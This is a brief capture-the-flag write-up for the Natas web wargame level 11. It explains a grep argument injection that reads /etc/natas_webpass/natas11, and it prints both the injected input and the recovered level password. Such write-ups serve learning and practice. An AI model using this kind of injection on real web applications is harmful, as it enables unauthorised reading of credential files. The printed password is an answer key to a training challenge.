# Natas11

## Logic
More or less the same as last time but except *input is being filtered*. Seems they still haven’t fixed the way “key” is storing input. So we can exploit this the same way we did in natas9; but this time just using regular expressions.

By entering `.*`, tell grep to search for all, while ignoring case, and match it to etc/natas_webpass/natas11. The "#" character comments out *dictionary.txt*, preventing any errors from occurring.

## Input
```.* /etc/natas_webpass/natas11 #```

## Password
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
